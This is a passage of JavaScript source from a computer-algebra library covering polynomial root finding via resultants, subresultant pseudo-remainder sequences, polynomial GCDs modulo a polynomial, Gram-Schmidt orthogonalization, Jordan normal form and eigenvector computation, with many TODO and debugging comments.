            return tmp// do not call factorize as it is slow for large polynomials
          }
          return tmp.concat(getZeros1(t));
        }
        return p.getZeros(undefined, false);
      };

      //!TODO: 
      //!new 2021-01-03
      if (result.length < p.getDegree()) {
        //console.count('yyy');
        var resultant = function (v1, v2) {
          var A = Polynomial.toPolynomial(cpa, new Expression.Symbol(v1));
          var B = Polynomial.toPolynomial(cpb, new Expression.Symbol(v1));
          return Polynomial.toPolynomial(Polynomial.resultant(A, B), new Expression.Symbol(v2)).primitivePart();
        };
        var bCandidates = getZeros1(resultant('a', 'b'));
        bCandidates = bCandidates.filter(function (c) { return Expression._isPositive(c); });//!?
        bCandidates = bCandidates.map(function (c) { return c instanceof ExpressionWithPolynomialRoot && c.root.polynomial.getDegree() / c.root.polynomial.getGCDOfTermDegrees() <= 2 ? c.upgrade() : c; });//TODO: !?
        //!new
        if (true) {
          var A = Polynomial.toPolynomial(cpa, new Expression.Symbol('a')).map(function (c) { return Polynomial.toPolynomial(c, new Expression.Symbol('b')); });
          var B = Polynomial.toPolynomial(cpb, new Expression.Symbol('a')).map(function (c) { return Polynomial.toPolynomial(c, new Expression.Symbol('b')); });
          //var g0 = Polynomial.polynomialGCD(A, B);
          //console.log(g0.toString());
          var gp = undefined;
          var previousPolynomial = Polynomial.ZERO;//TODO: !?
          for (var iteratorb = bCandidates[globalThis.Symbol.iterator](), b = iteratorb.next().value; b != null; b = iteratorb.next().value) {
            var g = null;
            //TODO: fix access to private properties (!!!)
            if ((!(b instanceof ExpressionWithPolynomialRoot) || !b.e.equals(b.root)) &&
                (!(b instanceof ExpressionPolynomialRoot) || !b.root.getAlphaExpression().equals(new Expression.Symbol('Î±')))) { //TODO: ?
              var A1 = A.map(function (c) { return c.calcAt(b); });
              var B1 = B.map(function (c) { return c.calcAt(b); });
              g = Polynomial.polynomialGCD(A1, B1);
            } else {
              var bRootPolynomial = (b instanceof ExpressionPolynomialRoot ? b.root.upgrade().getAlpha() : b.root).polynomial;
              if (!previousPolynomial.equals(bRootPolynomial)) {
                gp = polynomialGCDModuloPolynomial(A, B, bRootPolynomial);
                gp = gp.map(function (c) { return c.polynomial; });
                previousPolynomial = bRootPolynomial;
              }
              //g = gp.map(function (c) { return c.calcAt(b); });
              g = gp.map(function (c) { return b._calc(c); });
              
              //debugger;
              //var res = Polynomial.toPolynomial(Polynomial.resultant(gp.map(function (c) { return new Expression.Polynomial(c); }).calcAt(new Expression.Polynomial(Polynomial.of(RPN('a')))).polynomial.primitivePart(), bRootPolynomial), new Expression.Symbol("a")).primitivePart();
              //res.getZeros();
              //console.log(res.getDegree(), A.getDegree(), B.getDegree());
            }
            //TODO: g.getDegree() > 1 is possible (!!!)
            if (g.getDegree() >= 3) {
              console.log('g!!!', g.toString());
              var polynomial0 = this;
              window.setTimeout(function () {
                throw new TypeError("good test: " + polynomial0.toString());
              }, 0);
            }
            var getroots0 = function (np) {//TODO: REMOVE (g.getroots()) can be too slow
              var p = np.getCoefficient(1).divide(np.getCoefficient(2));
              var q = np.getCoefficient(0).divide(np.getCoefficient(2));
              var pOver2Negate = p.divide(Expression.TWO).negate();
              var sD = pOver2Negate._pow(2).subtract(q).squareRoot();
              var x1 = pOver2Negate.subtract(sD);
              var x2 = pOver2Negate.add(sD);
              return [x1, x2];
            };
            if (g.getDegree() <= 2) {
              //var roots = g.getroots();
              var roots = g.getDegree() === 2 ? getroots0(g) : g.getroots();
              for (var iteratora = roots[globalThis.Symbol.iterator](), a = iteratora.next().value; a != null; a = iteratora.next().value) {
                if (!Expression.has(a, Expression.Complex)) {
                  var candidate = a.add(b.multiply(Expression.I));
                  result.push(candidate);
                  result.push(candidate.complexConjugate());
                }
              }
            } else {
              //debugger;
              //TODO: ?
            }
          }
        }
        
        if (result.length < p.getDegree()) {
          //debugger;
          result = result.filter(function (root) { return Expression.isReal(root); });
        var aCandidates = getZeros1(resultant('b', 'a'));
          
        //!
        //console.log(bCandidates.map(function (x) { return typeof x.upgrade === 'function' ?  x.upgrade() : x; }).toString());
        //console.log(aCandidates.map(function (x) { return typeof x.upgrade === 'function' ?  x.upgrade() : x; }).toString());
        // https://en.wikipedia.org/wiki/Resultant#Application_to_polynomial_systems
        //debugger;
        for (var iteratora = aCandidates[globalThis.Symbol.iterator](), a = iteratora.next().value; a != null; a = iteratora.next().value) {
          for (var iteratorb = bCandidates[globalThis.Symbol.iterator](), b = iteratorb.next().value; b != null; b = iteratorb.next().value) {
            var candidate = a.add(b.multiply(Expression.I));
            if (p.calcAt(candidate).equals(Expression.ZERO)) {
              result.push(candidate);
              result.push(candidate.complexConjugate());
            }
          }
        }
        
        }
      }
    }
    //!

    return result;
  };

function pseudoRemainderSequence(A, B, type, produceSturmSequence) {
type = type == undefined ?  "primitive" : type;
produceSturmSequence = produceSturmSequence == undefined ?  false : produceSturmSequence;

  var g = Math.gcd(A.getGCDOfTermDegrees(), B.getGCDOfTermDegrees());
  if (g > 1) {
    console.error('g > 1');
  }
  var first = true;
  var phi = Expression.ONE;
  var iterator = {
    next: function () {
      console.assert(A.getDegree() >= B.getDegree());
      if (!B.equals(Polynomial.ZERO)) {
        var d = A.getDegree() - B.getDegree();
        var scale = B.getLeadingCoefficient()._pow(d + 1);
        var tmp = A.scale(produceSturmSequence ? scale.abs() : scale).divideAndRemainder(B, B._hasIntegerLikeCoefficients() ? "throw" : undefined);
        var q = tmp.quotient;
        var r = tmp.remainder;
        var Î± = Expression.ONE;
        if (type === "trivial") {
          // https://en.wikipedia.org/wiki/Polynomial_greatest_common_divisor#Trivial_pseudo-remainder_sequence
          Î± = Expression.ONE;
        } else if (type === "primitive") {
          // https://en.wikipedia.org/wiki/Polynomial_greatest_common_divisor#Primitive_pseudo-remainder_sequence
          Î± = r.getContent();
        } else if (type === "subresultant") {
          // For the explanation and proof see Donald E. Knuth The Art of computer programming Third Edition, Volume 2 (Seminumerical algorithms), page 428.
          // https://en.wikipedia.org/wiki/Polynomial_greatest_common_divisor#Subresultant_pseudo-remainder_sequence
          Î± = first ? Expression.ONE : A.getLeadingCoefficient().multiply(phi._pow(d));
          first = false;
          phi = d === 0 ? phi : B.getLeadingCoefficient()._pow(d).divide(phi._pow(d).divide(phi));
        } else {
          throw new RangeError(type);
        }
        //var R = r.divideAndRemainder(Polynomial.of(produceSturmSequence ? Î±.abs().negate() : Î±), "throw").quotient;
        var R = r.map(function (c) { return c.divide(produceSturmSequence ? Î±.abs().negate() : Î±); });
        var value = {R: R, q: q, Î±: Î±};
        A = B;
        B = R;
        return {value: value, done: false};
      }
      return {value: undefined, done: true};
    }
  };
  iterator[globalThis.Symbol.iterator] = function () {
    return this;
  };
  return iterator;
}

Polynomial._pseudoRemainderSequence = pseudoRemainderSequence;

Polynomial._resultantUsingSubresultantPseudoRemainderSequence = function (A, B) {
  function toMultivariatePolynomial(p1, p2) {
    if (p1.getLeadingCoefficient() instanceof Expression.Polynomial ||
        p2.getLeadingCoefficient() instanceof Expression.Polynomial) {
      return {variables: [], A: p1, B: p2};//TODO: fix !!!
    }
    var set = {};
    var variables = [];
    var v = function (e) {
      for (var iterators = e.summands()[globalThis.Symbol.iterator](), s = iterators.next().value; s != null; s = iterators.next().value) {
        for (var iteratorf = s.factors()[globalThis.Symbol.iterator](), f = iteratorf.next().value; f != null; f = iteratorf.next().value) {
          if (f instanceof Expression.Exponentiation) {
            f = f.a;//TODO: !
          }
          if (f instanceof Expression.Symbol && Object.getPrototypeOf(f) === Expression.Symbol.prototype) {//TODO: !?
            if (set[f.symbol] == undefined) {
              variables.push(f);
              set[f.symbol] = true;
            }
          }
        }
      }
    };
    for (var i = 0; i < p1.a.size; i += 1) {
      v(p1.a.coefficient(i));
    }
    for (var i = 0; i < p2.a.size; i += 1) {
      v(p2.a.coefficient(i));
    }
    //debugger;
    var f = function (p, index) {
      if (index === variables.length) {
        console.assert(p.hasIntegerCoefficients());
        return p;
      }
      var v = variables[index];
      return p.map(function (c) { return new Expression.Polynomial(f(Polynomial.toPolynomial(c, v), index + 1)); });
    };
    return {variables: variables, A: f(p1, 0), B: f(p2, 0)};
  }
  function toExpression(variables, p) {
    if (p.equals(Expression.ZERO)) {
      return p;//!?
    }
    if (variables.length === 0) {
      return p;
    }
    return p.polynomial.map(function (c) { return toExpression(variables.slice(1), c); }).calcAt(variables[0]);
  }
  if (A.getDegree() === Polynomial.ZERO.getDegree() || B.getDegree() === Polynomial.ZERO.getDegree()) {
    return Expression.ZERO;
  }
  var g = Math.gcd(A.getGCDOfTermDegrees(), B.getGCDOfTermDegrees());
  if (g > 1) {
    // why is this true?
    var tmp = Polynomial._resultantUsingSubresultantPseudoRemainderSequence(A._exponentiateRoots(g), B._exponentiateRoots(g));
    //TODO: ?
    return tmp._pow(g);
  }
  var tmp1 = toMultivariatePolynomial(A, B);
  A = tmp1.A;
  B = tmp1.B;
  var AA = A;
  var BB = B;
  var start = Date.now();
  var resultantSign = 1;
  if (A.getDegree() < B.getDegree()) {
    var tmp = A;
    A = B;
    B = tmp;
    resultantSign *= Math.pow(Math.pow(-1, A.getDegree()), B.getDegree()); // https://en.wikipedia.org/wiki/Resultant#Characterizing_properties
  }
  var resultant2 = [];
  var isPseudoRemainderSequence = true;
  // https://en.wikipedia.org/wiki/Resultant#Invariance_under_change_of_polynomials
  for (var iteratortmp = Polynomial._pseudoRemainderSequence(A, B, "subresultant")[globalThis.Symbol.iterator](), tmp = iteratortmp.next().value; tmp != null; tmp = iteratortmp.next().value) {
    var R = tmp.R;
    var Î± = tmp.Î±;
    // Seems, all the properties can be seen when looking what happens with the determinant:
    if (B.getDegree() > 0) {
      if (R.getDegree() < 0) {
        while (resultant2.length > 0) {
          resultant2.pop();
        }
        resultant2.push({base: Expression.ZERO, exponent: 1});
      } else {
        if (!Î±.equals(Expression.ONE)) {
          if (resultant2.length > 0) {
            var previous = resultant2.pop();
            resultant2.push({base: previous.base, exponent: previous.exponent + 2 * B.getDegree()});
            resultant2.push({base: Î±.divide(previous.base._pow(2)), exponent: B.getDegree()});
          } else {
            resultant2.push({base: Î±, exponent: B.getDegree()});
          }
        }
        resultant2.push({base: B.getLeadingCoefficient(), exponent: (A.getDegree() - R.getDegree()) - (isPseudoRemainderSequence ? B.getDegree() * (A.getDegree() - B.getDegree() + 1) : 0)});
        resultantSign *= Math.pow(Math.pow(-1, A.getDegree()), B.getDegree()); // https://en.wikipedia.org/wiki/Resultant#Characterizing_properties
      }
    } else {
      console.assert(B.getDegree() === 0 && R.getDegree() < 0);
      resultant2.push({base: B.getLeadingCoefficient(), exponent: A.getDegree()});
    }
    A = B;
    B = R;
  }
  var resultant = resultantSign === -1 ? Expression.ONE.negate() : Expression.ONE;
  for (var iteratorx = resultant2[globalThis.Symbol.iterator](), x = iteratorx.next().value; x != null; x = iteratorx.next().value) {
    if (x.exponent < 0) {
      resultant = resultant.divide(x.base._pow(-x.exponent));
    } else if (x.exponent > 0) {
      resultant = resultant.multiply(x.base._pow(x.exponent));
    }
  }
  var end = Date.now();
  if (end - start > 250) {
    console.log(end - start, AA.toString(), BB.toString());
  }
  resultant = toExpression(tmp1.variables, resultant);
  return resultant;
};

Expression._FIELD = {
  ONE: Expression.ONE,
  sub: function (a, b) { return a.subtract(b); },
  mul: function (a, b) { return a.multiply(b); },
  div: function (a, b) { return a.divide(b); },
  scale: function (a, s) { return a.multiply(Expression.Integer.fromBigInt(s)); }
};

Polynomial.resultant = function (p, q) {
  //TODO: do not multiply
  //return Polynomial._resultantByModularAlgorithm(p, q);
  return Polynomial._resultantUsingSubresultantPseudoRemainderSequence(p, q);
};



//TODO: remove (use Polynomial#_scaleRoots, Polynomial#_exponentiateRoots, Polynomial#_translateRoots instead)
//Polynomial.prototype.subs = function (variableMapFunction) {
//  var variable = new Expression.Symbol('$x');//TODO:
//  return Polynomial.toPolynomial(this.calcAt(variableMapFunction(variable)).getNumerator(), variable);
//};

function GramSchmidtOrthogonalization(vectors) {
  if (false) {
    //TODO: remove (?)
    var V = vectors;
    var n = V[0].dimensions();
    var k = V.length;
    var U = new Array(k).fill(null).map(function (x) { return new Matrix.Vector(new Array(n).fill(Expression.ZERO)); });;
    U[0] = V[0];
    for (var i = 1; i < k; i += 1) {
        U[i] = V[i];
        for (var j = 0; j < i; j += 1) {
            U[i] = U[i].subtract(U[j].scale(U[i].dot(U[j]).divide(U[j].dot(U[j]))));
        }
    }
    return U;
  }
  // https://en.wikipedia.org/wiki/Gram%E2%80%93Schmidt_process#Via_Gaussian_elimination
  var rowVectorsMatrix = Matrix.fromVectors(vectors).transpose();
  var A = rowVectorsMatrix;
  var matrix = A.multiply(A.conjugateTranspose()).augment(A).toRowEchelon(Matrix.Gauss, "row-reduction").matrix;
  var tmp = matrix.slice(0, matrix.rows(), A.rows(), matrix.cols());
  var result = new Array(tmp.rows());
  for (var i = 0; i < tmp.rows(); i += 1) {
    result[i] = tmp.row(i);
  }
  return result;
}

globalThis.GramSchmidtOrthogonalization = GramSchmidtOrthogonalization;

Expression.Complex.prototype.abs = function () {
  // https://en.wikipedia.org/wiki/Absolute_value#Complex_numbers
  return this.multiply(this.conjugate()).squareRoot();
};
Expression.Division.prototype.abs = function () {
  return this.getNumerator().abs().divide(this.getDenominator().abs());
};
Expression.prototype.abs = function () {//TODO: remove - ?
  if (this instanceof Expression.Symbol) {
    return new Expression.Abs(this);//TODO: !?
  }
  if (this instanceof Expression.Multiplication) {
    return this.a.abs().multiply(this.b.abs());
  }
  if (this instanceof Expression.Abs) {
    return this;
  }
  if (this.compareTo(Expression.ZERO) < 0) {
    return this.negate();
  }
  return this;
};
Expression.prototype.compareTo = function (other) {//TODO: remove - ?
  if (other.equals(Expression.ZERO)) {
    if (Expression._isPositive(this)) {
      return +1;
    }
    if (Expression._isPositive(this.negate())) {
      return -1;
    }
    throw new TypeError(this.toString());
  }
  return this.subtract(other).getNumerator().compareTo(Expression.ZERO);
};
Expression.prototype.sign = function () {
  return this.compareTo(Expression.ZERO);
};
Expression.prototype.round = function () {//TODO: remove - ?
  //TODO: half away from zero - ?
  //console.log(this.getNumerator(), this.getDenominator());
  //return this.getNumerator().add(this.getDenominator().truncatingDivide(Expression.TWO)).truncatingDivide(this.getDenominator());
  return ExpressionParser.parse(toDecimalStringInternal(this, {fractionDigits: 0}));
};

//console.assert(GramSchmidtOrthogonalization(new Matrix([[Expression.Integer.fromNumber(3), Expression.Integer.fromNumber(1)], [Expression.Integer.fromNumber(2), Expression.Integer.fromNumber(2)]])).toString() === '{{3,1},{-2/5,6/5}}');
//console.assert(GramSchmidtOrthogonalization(new Matrix([[Expression.Integer.fromNumber(3), Expression.Integer.fromNumber(1)], [Expression.Integer.fromNumber(2), Expression.Integer.fromNumber(2)], [new Expression.Integer(0), new Expression.Integer(0)]])).toString() === '{{3,1},{-2/5,6/5},{0,0}}');
//throw new Error();


// Math.log2(Math.hypot.apply(null, coefficients))
Polynomial.prototype._log2hypot = function () {
  var max = Expression.ZERO;
  for (var i = 0; i < this.a.size; i += 1) {
    var c = this.a.coefficient(i).abs();
    if (c.compareTo(max) > 0) {
      max = c;
    }
  }
  var shift = Math.max(max.bitLength() - ((1024 - 53 - 1) / 2), 0);
  var unscale = Expression.TWO._pow(shift);
  var s = 0;
  for (var i = 0; i < this.a.size; i += 1) {
    s += Math.pow(this.a.coefficient(i).truncatingDivide(unscale).toNumber(), 2);
  }
  return shift + Math.log2(Math.sqrt(s));
};

Polynomial.prototype._log2OfBoundForCoefficientsOfFactor = function (factorDegreeBound, factorLeadingCoefficientBound) {
  // https://en.wikipedia.org/wiki/Geometrical_properties_of_polynomial_roots#:~:text=This%20bound%20is%20also%20useful%20to%20bound%20the%20coefficients%20of%20a%20divisor%20of%20a%20polynomial%20with%20integer%20coefficients:
  // see also
  // The art of computer programming. Vol.2: Seminumerical algorithms
  // exersize 20, page 458
  // which gives better result (~2 times smaller)
  if (factorDegreeBound == undefined) {
    factorDegreeBound = this.getDegree();
  }
  if (factorDegreeBound === 0) {
    return 0;
  }
  if (factorLeadingCoefficientBound == undefined) {
    factorLeadingCoefficientBound = this.getLeadingCoefficient().abs();
  }
  var log2 = function (integer) {
    var e = integer.bitLength();
    if (e <= 53) {
      return Math.log2(integer.toNumber());
    }
    return (e - 53) + Math.log2(integer.truncatingDivide(Expression.TWO._pow(e - 53)).toNumber());
  };
  var centralBinomialCoefficientBound = function (n) {
    return (n - Math.log2(Math.sqrt(Math.PI * Math.ceil(n / 2))));
  };
  var m = factorDegreeBound;
  var e = centralBinomialCoefficientBound(m) + (log2(factorLeadingCoefficientBound.abs()) - log2(this.getLeadingCoefficient().abs())) + this._log2hypot();
  return e;
};


Polynomial.prototype.isDivisibleBy = function (guess) {
  var w = undefined;
  var s = Expression.ONE;
  if (this._hasIntegerLikeCoefficients() &&
      guess._hasIntegerLikeCoefficients()) {
    // for performance
    // https://en.wikipedia.org/wiki/Gauss%27s_lemma_(polynomials) - ?
    w = "undefined";
    s = guess.getContent();
  }
  var tmp = this.scale(s).divideAndRemainder(guess, w);
  return tmp != null && tmp.remainder.equals(Polynomial.ZERO);
};


// returns a GCD of polynomials where coefficients are polynomials modulo polynomial M, leading coefficient is set to 1
function polynomialGCDModuloPolynomial(A, B, M) {
  function modulo(B, M) { // Note: this may increase the coefficient because of the scaling and so make the execution slower
    var BmodM = B.map(function (c) { return new Expression.Polynomial(c.polynomial.divideAndRemainder(M).remainder); });
    var d = BmodM.map(function (c) { return c.polynomial.getContent(); }).getContent().inverse(); //TODO: ?
    return BmodM.scale(new Expression.Polynomial(Polynomial.of(d)));
  }
  function toMonic(A, M) {
    //Note: it is faster for some polynomials to make A modulo M at first
    if (A.getDegree() < 0) {
      return A;
    }
    return modulo(A.scale(new Expression.Polynomial(A.getLeadingCoefficient().polynomial.primitivePart().modularInverse(M).primitivePart())), M);
  }
  A = A.map(function (c) { return new Expression.Polynomial(c); });
  B = B.map(function (c) { return new Expression.Polynomial(c); });
  if (A.getDegree() < B.getDegree()) {
    var tmp = A;
    A = B;
    B = tmp;
  }
  if (B.getDegree() >= 0 && modulo(Polynomial.of(B.getLeadingCoefficient()), M).equals(Polynomial.ZERO)) {
    return polynomialGCDModuloPolynomial(modulo(A, M).map(function (c) { return c.polynomial; }), modulo(B, M).map(function (c) { return c.polynomial; }), M);
  }
  for (var iteratortmp = Polynomial._pseudoRemainderSequence(A, B, "subresultant")[globalThis.Symbol.iterator](), tmp = iteratortmp.next().value; tmp != null; tmp = iteratortmp.next().value) {
    var newR = tmp.R;
    A = B;
    B = newR;
    if (B.getDegree() >= 0 && modulo(Polynomial.of(B.getLeadingCoefficient()), M).equals(Polynomial.ZERO)) {
      return polynomialGCDModuloPolynomial(modulo(A, M).map(function (c) { return c.polynomial; }), modulo(B, M).map(function (c) { return c.polynomial; }), M);
    }
  }
  return toMonic(modulo(A, M), M);
}

globalThis.testables = globalThis.testables || {};
globalThis.testables.polynomialGCDModuloPolynomial = polynomialGCDModuloPolynomial;


})();
(function () {
"use strict";



// https://ca.wikipedia.org/wiki/Forma_canÃ²nica_de_Jordan

// https://es.wikipedia.org/wiki/Forma_canÃ³nica_de_Jordan

Expression.getSolutionSet = function getSolutionSet(matrix) {
  var fullMatrix = matrix.augment(Matrix.Zero(matrix.cols(), 1));
  //TODO: Matrix.GaussMontante
  var result = fullMatrix.toRowEchelon(Matrix.GaussJordan, "solving", undefined);
  var tmp = Matrix.solveByGaussNext(result.matrix);
  var basisVectors = Matrix.getSolutionSet(tmp).basisVectors;
  return basisVectors;//?
};

Expression.getFormaDeJordan = function (matrix, eigenvalues, hack) {
  function matrixFromBlocks(blocks) {
    var start = 0;
    var J = Matrix.Zero(n, n);
    for (var i = 0; i < blocks.length; i += 1) {
      var b = blocks[i];
      J = J.map(function (e, i, j) {
        if (i >= start && i < start + b.size) {
          return i === j ? b.eigenvalue : (i !== start + b.size - 1 && j === i + 1 ? Expression.ONE : Expression.ZERO);
        }
        return e;
      });
      start += b.size;
    }
    return J;
  }
  function isSolution(coefficientMatrix, vector) {
    var f = coefficientMatrix.multiply(vector);
    return f.eql(Matrix.Zero(f.rows(), 1));
  }
  function isLinearlyIndependentSet(basis, vectors) {
    // https://math.stackexchange.com/questions/412563/determine-if-vectors-are-linearly-independent
    return Matrix.fromVectors(basis.concat(vectors)).rank() === basis.length + vectors.length;
  }
  
  if (arguments.length > 3 || (arguments[2] !== true && arguments[2] !== undefined)) {
    throw new TypeError();
  }

  var uniqueEigenvalues = Expression.unique(eigenvalues);

  //!TODO: remove
  if (uniqueEigenvalues.length === matrix.rows()) {
    var eigenvectors = Expression.getEigenvectors(matrix, eigenvalues);
    var tmp = Expression.diagonalize(matrix, eigenvalues, eigenvectors);
    var P = tmp.T;
    var J = tmp.L;
    var P_INVERSED = tmp.T_INVERSED;
    //console.log("P=" + P.toString() + ", J=" + J.toString());
    return {
      P: P,
      J: J,
      P_INVERSED: P_INVERSED
    };
  }
  //!

  var A = matrix;
  var n = A.rows();

  var basis = [];
  var blocks = [];
  for (var i = 0; i < uniqueEigenvalues.length; i += 1) {
    // https://en.wikipedia.org/wiki/Generalized_eigenvector#Computation_of_generalized_eigenvectors
    var basisCorrespondingToTheEigenvalue = []; // TODO: optimize (n**3 -> n**2)
    var eigenvalue = uniqueEigenvalues[i];
    var algebraicMultiplicity = eigenvalues.reduce(function (count, e) { return count + (e === eigenvalue ? 1 : 0); }, 0);
    var B = A.subtract(Matrix.I(n).scale(eigenvalue));
    var m = 1;
    while (B.pow(m).rank() > n - algebraicMultiplicity) {
      m += 1;
    }
    m += 1;
    while (--m >= 1) {
      //var z = 0;
      //var pm = B.pow(m - 1).rank() - 2 * B.pow(m).rank() + B.pow(m + 1).rank();
      var solutionSet = Expression.getSolutionSet(B.pow(m));  // "kernel of A"
      for (var j = 0; j < solutionSet.length; j += 1) {
        var solution = solutionSet[j];
        //if (z < pm) {
        //console.log(B.pow(m).augment(solution).rank(), m, n);
        if (!isSolution(B.pow(m - 1), solution)) {
          var chain = [];
          var s = solution;
          for (var k = 0; k < m; k += 1) {
            chain.push(s);
            s = B.multiply(s).col(0);
          }
          chain.reverse();
          if (isLinearlyIndependentSet(basisCorrespondingToTheEigenvalue, chain)) {
            //z += 1;
            basis = basis.concat(chain);
            basisCorrespondingToTheEigenvalue = basisCorrespondingToTheEigenvalue.concat(chain);
            blocks.push({
              size: m,
              eigenvalue: eigenvalue
            });
          }
        }
        //}
      }
    }
  }
  var J = matrixFromBlocks(blocks);
  if (basis.length !== n) {
    throw new TypeError("assertion failed");
  }
  var P = Matrix.fromVectors(basis);
  //console.log("P=" + P.toString() + ", J=" + J.toString());
  //var P_INVERSED = P.inverse();
  var P_INVERSED = P.isExact() ? P.inverse() : (hack ? null : getInverse(A, eigenvalues, P));
  if (!hack && P.isExact()) {
  if (A.toString() !== P.multiply(J).multiply(P_INVERSED).toString()) {
    throw new TypeError("assertion failed");
  }
  }
  return {
    P: P,
    J: J,
    P_INVERSED: P_INVERSED
  };
};

// A = P*J*P^-1
// A^T = (P^-1)^T*J^T*P^T
// Note:
// (0 0 0 1)         (0 0 0 1)
// (0 0 1 0)         (0 0 1 0)
// (0 1 0 0) * J^T * (0 1 0 0) = J
// (1 0 0 0)         (1 0 0 0)
// where on the left we are doing row spaws, then doing column swaps.
// Note: the inverse of the anti-diagonal unitary matrix is the matrix itself.
// A^T = X*Y*X^-1
// (P^-1)^T*J^T*P^T = X*Y*X^-1
// (P^-1)^T*B^-1*J*B*P^T = X*Y*X^-1
// Then P^-1 = (X*B)^T .

var getInverse = function (A, eigenvalues, P) {
  // https://en.wikipedia.org/wiki/Diagonalizable_matrix : The row vectors of P^âˆ’1 are the left eigenvectors of A
  // https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors#Left_and_right_eigenvectors :  a left eigenvector of A is the same as the transpose of a right eigenvector of A^T, with the same eigenvalue
  var AT = A.transpose();
  var tmp2 = Expression.getFormaDeJordan(AT, eigenvalues, true);
  var J = tmp2.J;
  var X = tmp2.P;

  var n = A.cols();
  var B = Matrix.Zero(n, n).map(function (e, i, j) {
    function getCurrentBlock() {
      var s = i;
      while (s - 1 >= 0 && s < n && J.e(s - 1, s).equals(Expression.ONE)) {
        s -= 1;
      }
      var e = i;
      while (e + 1 < n && J.e(e, e + 1).equals(Expression.ONE)) {
        e += 1;
      }
      return {s: s, e: e};
    }
    var tmp = getCurrentBlock();
    return tmp.s + tmp.e === i + j ? Expression.ONE : Expression.ZERO;
  });

  var P_INVESRED = X.multiply(B).transpose();
  return Expression._unscaleInverseMatrix(P_INVESRED, P);
};
Expression._getInverse = getInverse;

})();
(function () {
"use strict";





globalThis.factorsMap = new Map();

Expression.getPolynomialRootsWithSteps = function (polynomial, callback) {
  var roots = polynomial.getroots(callback);

  //TODO: tests
  //!2018-05-28
  //!2018-07-11
  // experimental code
  var zeros = [];
  if (typeof polynomial.getZeros === "function" && roots.length !== polynomial.getDegree()) {
    var p = Polynomial.of(Expression.ONE);
    for (var i = 0; i < roots.length; i += 1) {
      p = p.multiply(Polynomial.of(roots[i].negate(), Expression.ONE));
    }
    var r = polynomial.divideAndRemainder(p).quotient;
    globalThis.factorsMap = new Map();
    var getZerosTricky = function (f) {
      var pp = f.primitivePart();
      if (!pp.hasIntegerCoefficients()) {//TODO: !?
        return f.getZeros(0, true);
      }
      f = pp;
      
      // https://en.wikipedia.org/wiki/Square-free_polynomial
      var tmp = f.squareFreeFactors();
      var a0 = tmp.a0;
      var a1 = tmp.a1;

      if (a0.getDegree() !== 0) {
        var tmp1 = getZerosTricky(a1); // roots with multiplicity = 1 (?)
        var tmp2 = getZerosTricky(a0);
        var result = [];
        var previous = undefined;
        for (var i = 0; i < tmp2.length; i += 1) {
          var zero = tmp2[i];
          if (zero !== previous) {
            result.push(zero);
            previous = zero;
          }
          result.push(zero);
        }
        return tmp1.concat(result);
      }
      
      var factor = f.factorize();
      if (factor == null) {
        factor = f;
      }
      if (!factor.equals(f)) {
        return getZerosTricky(factor).concat(getZerosTricky(f.divideAndRemainder(factor, "throw").quotient));
      }
      var zeros = factor.getZeros(0, true);
      for (var iteratorzero = zeros[globalThis.Symbol.iterator](), zero = iteratorzero.next().value; zero != null; zero = iteratorzero.next().value) {
        globalThis.factorsMap.set(zero, factor);
      }
      return zeros;
    };
    //zeros = r.getZeros(0, true);
    zeros = getZerosTricky(r);
    if (callback != undefined) {
      if (zeros.length === r.getDegree()) {//TODO: !!!
        callback({content: Expression.ONE, roots: roots.concat(zeros), newPolynomial: Polynomial.of(polynomial.getLeadingCoefficient()), type: "realRootIsolationAndNewton'sMethod"});
      }
    }
  }
  //!

  // removing of duplicates
  for (var i = 0; i < roots.length; i += 1) {
    var root = roots[i];
    for (var j = 0; j < roots.length; j += 1) {
      if (roots[j].equals(root)) {
        //debugger;
        roots[j] = root;
      }
    }
  }

  return roots.concat(zeros);
};

Expression.getEigenvalues = function (matrix, callback) {

  if (!matrix.isSquare()) {
    throw new RangeError("NonSquareMatrixException");
  }
  // TODO: remove Polynomial

  var determinant = matrix.map(function (e, i, j) {
    var p = i === j ? Polynomial.of(e, Expression.ONE.negate()) : (e.equals(Expression.ZERO) ? Polynomial.ZERO : Polynomial.of(e));
    return new Expression.Polynomial(p);
  }).determinant();
  determinant = determinant.polynomial;

  //!new (sin/cos)
  //TODO: fix
  determinant = determinant.map(function (e) { return e.simplifyExpression(); });

  var characteristicPolynomial = determinant;//!TODO: fix
  if (callback != null) {
    callback(characteristicPolynomial);//TODO: !?
  }

//TODO:
  var eigenvalues = Expression.getPolynomialRootsWithSteps(characteristicPolynomial, callback);

  return eigenvalues;
};

// a/b, where a and b are integers
Expression.isRational = function (e) {
  return e instanceof Expression.Integer || e instanceof Expression.BinaryOperation && Expression.isRational(e.a) && Expression.isRational(e.b);
};
Expression.isRationalMatrix = function (A) {
  for (var i = 0; i < A.rows(); i += 1) {
    for (var j = 0; j < A.cols(); j += 1) {
      if (!Expression.isRational(A.e(i, j))) {
        return false;
      }
    }
  }
  return true;
};

Expression.getEigenvectors = function (matrix, eigenvalues, internal) {
internal = internal == undefined ?  false : internal;

  if (eigenvalues == undefined) {
    throw new TypeError();//TODO: remove
    eigenvalues = Expression.getEigenvalues(matrix);
  }

  var eigenvectors = new Array(eigenvalues.length).fill(null);
  var uniqueEigenvalues = Expression.unique(eigenvalues);
  
  var setResults = function (eigenvalue, currentEigenvectors) {
    var j = 0;
    for (var k = 0; k < eigenvalues.length && j < currentEigenvectors.length; k += 1) {
      if (eigenvalues[k] === eigenvalue) {
        eigenvectors[k] = currentEigenvectors[j];
        j += 1;
      }
    }
    if (j < currentEigenvectors.length) {
      throw new TypeError("wrong eigenvalues argument");
    }
  };

  if (!internal && matrix.isSquare() && Expression.isRationalMatrix(matrix)) {//todo: complex (?)
    var map = new Map();
    for (var iteratoreigenvalue = uniqueEigenvalues[globalThis.Symbol.iterator](), eigenvalue = iteratoreigenvalue.next().value; eigenvalue != null; eigenvalue = iteratoreigenvalue.next().value) {
      var factor = globalThis.factorsMap.get(eigenvalue);
      if (factor == null || factor.getDegree() <= 1) {
        var currentEigenvectors = Expression.getEigenvectors(matrix, eigenvalues.filter(function (e) { return e === eigenvalue; }), true);
        setResults(eigenvalue, currentEigenvectors);
      } else {
        var currentEigenvectors = map.get(factor);
        if (currentEigenvectors == null) {
          currentEigenvectors = Expression.getEigenvectors(matrix, [SomePolynomialRoot.create(factor)], true);
          map.set(factor, currentEigenvectors);
        }
        var zeroPows = [];
        zeroPows.push(Expression.ONE);
        var subs = function (x) {
          return x instanceof SomePolynomialRoot ? x.calcAt(eigenvalue, zeroPows) : x;
        };
